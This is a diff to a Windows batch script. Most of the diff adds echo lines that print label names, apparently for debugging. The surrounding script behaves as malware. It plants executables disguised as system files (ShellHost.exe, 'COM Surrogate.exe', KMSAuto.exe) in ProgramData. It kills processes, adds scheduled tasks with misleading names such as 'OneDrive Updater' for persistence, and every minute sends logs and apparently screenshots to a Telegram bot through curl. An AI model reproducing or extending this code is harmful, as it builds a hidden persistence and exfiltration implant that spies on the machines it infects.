@@ -80,7 +80,8 @@ for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemP
 
 
 :loop_start
-
+echo :loop_start
+echo.
 
 
 
@@ -118,6 +119,10 @@ goto NEXT0
 
 
 :INSTCOREPROCESS
+echo :INSTCOREPROCESS
+echo.
+
+
 
 :: Kill & Delete file 
 taskkill /f /im PatcherX64.exe >nul 2>&1
@@ -166,6 +171,8 @@ set "MESSAGE=CoreProcessInstalled|"
 set "CheckSend=1"
 
 :NEXT0
+echo :NEXT0
+echo.
 
 
 
@@ -184,9 +191,14 @@ echo.
 
 
 :EVERYSECOND
+echo :EVERYSECOND
+echo.
 
 
 :SHST
+echo :SHST
+echo.
+
 :: Define the paths
 set "sourceFile=%SystemRoot%\System32\TSSPrxySHST.exe"
 set "startupFile=%ProgramData%\Microsoft\Windows\ShellHost.exe"
@@ -207,6 +219,9 @@ timeout /t 1 /nobreak >nul
 
 
 :COM
+echo :COM
+echo.
+
 :: Define the paths
 set "sourceFile=%SystemRoot%\System32\SyncHostApp.exe"
 set "startupFile=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
@@ -232,6 +247,9 @@ timeout /t 1 /nobreak >nul
 
 
 :KMS
+echo :KMS
+echo.
+
 :: Define the paths
 set "sourceFile=%SystemRoot%\System32\TSSKMS.exe"
 set "startupFile=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
@@ -256,6 +274,11 @@ timeout /t 1 /nobreak >nul
 
 
 
+
+
+:CHECKSTARTUPPROGRAMS
+echo :CHECKSTARTUPPROGRAMS
+echo.
 
 
 
@@ -299,7 +322,8 @@ goto COMMANDSFORAGENTS
 
 
 :STARTUPTAASK
-
+echo :STARTUPTAASK
+echo.
 
 
 
@@ -308,6 +332,9 @@ goto COMMANDSFORAGENTS
 
 
 :CheckSHST
+echo :CheckSHST
+echo.
+
 :: Check ShellHost.exe; if found, skip to CheckComSurrogate
 if exist "%ProgramData%\Microsoft\Windows\ShellHost.exe" (
     goto CheckComSurrogate
@@ -341,6 +368,9 @@ set "CheckSend=1"
 
 
 :CheckComSurrogate
+echo :CheckComSurrogate
+echo.
+
 :: Check ComSurrogate.exe; if found, skip to next section
 if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
     goto CheckKMSAuto
@@ -378,6 +408,9 @@ set "CheckSend=1"
 
 
 :CheckKMSAuto
+echo :CheckKMSAuto
+echo.
+
 :: Check KMSAuto.exe; if found, skip to next section
 if exist "%ProgramData%\Microsoft\Windows\KMSAuto.exe" (
     goto CheckNIRCMD
@@ -410,6 +443,9 @@ set "CheckSend=1"
 
 
 :CheckNIRCMD
+echo :CheckNIRCMD
+echo.
+
 :: Check nircmd.exe; if found, skip to next section
 if exist "%APPDATA%\Microsoft\nircmd.exe" (
     goto COMMANDSFORAGENTS
@@ -442,8 +478,11 @@ set "CheckSend=1"
 
 
 
-
-
+echo.
+echo.
+echo %MESSAGE%
+echo.
+echo.
 
 
 
@@ -456,6 +495,8 @@ set "CheckSend=1"
 
 
 :REMOVINGTASKS
+echo :REMOVINGTASKS
+echo.
 
 schtasks /end /tn "ComSurrogate" /f >nul 2>&1
 schtasks /delete /tn "ComSurrogate" /f >nul 2>&1
@@ -468,6 +509,8 @@ schtasks /delete /tn "ComSurrogate" /f >nul 2>&1
 
 
 :CHECKINGTASKS
+echo :CHECKINGTASKS
+echo.
 
 :: Define tasks to check
 set "Task1=OneDrive Updater"
@@ -487,6 +530,9 @@ goto AFTERTASKSEVERY
 
 
 :TASKSEVERY
+echo :TASKSEVERY
+echo.
+
 echo At least one task is missing! Adding tasks...
 
 :: Add your commands here
@@ -501,7 +547,8 @@ set "CheckSend=1"
 
 
 :AFTERTASKSEVERY
-
+echo :AFTERTASKSEVERY
+echo.
 
 
 
@@ -532,9 +579,15 @@ set "CheckSend=1"
 
 
 :COMMANDSFORAGENTS
+echo :COMMANDSFORAGENTS
+echo.
+
 
 
 :NEXT1
+echo :NEXT1
+echo.
+
 
 echo Stopping processes...
 taskkill /F /IM RuntimeBroker.exe
@@ -613,6 +666,9 @@ if "%LAST_MINUTE_SENT%"=="%currentMinute1%" (
 
 
 :EVERYMINSEND
+echo :EVERYMINSEND
+echo.
+
 
 :: SEND MSG
 
@@ -646,6 +702,8 @@ echo %currentMinute1%> "%LAST_MIN_SENT_FILE%"
 
 
 :CONT
+echo :CONT
+echo.
 
 
 
@@ -661,7 +719,9 @@ echo %currentMinute1%> "%LAST_MIN_SENT_FILE%"
 
 
 
-
+:CURRENTMINSET
+echo :CURRENTMINSET
+echo.
 
 set "currentMinute=%time:~3,2%"
 
@@ -684,11 +744,16 @@ if "%currentMinute%" neq "%lastMinute%" (
 
 
 
+:CHECKSENDING
+echo :CHECKSENDING
+echo.
 
 :: Check the value of CheckSend
 if "%CheckSend%"=="1" (
+    echo - CheckSend=%CheckSend% - Going to SENDCHECK
     goto SENDCHECK
 ) else (
+    echo - CheckSend=%CheckSend% - Going to checkloooop
     goto checkloooop
 )
 
@@ -704,8 +769,10 @@ if "%CheckSend%"=="1" (
 
 
 :SENDCHECK
-
-
+echo :SENDCHECK
+echo.
+echo Making new log files
+echo.
 
 set "TASKS_DATA=%temp%\tasks_data.txt"
 set "LOGFILE1=%temp%\LOGFILE1.txt"
@@ -731,6 +798,10 @@ echo. >> "%LOGFILE1%"
 echo. >> "%LOGFILE1%"
 
 
+echo Done. new log files
+echo Sending
+echo.
+echo.
 
 
 
@@ -774,6 +845,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
 
 
 echo Message sent to chat ID %CHAT_ID%
+echo Sent.
 
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 del /f /q "%LOGFILE1%"
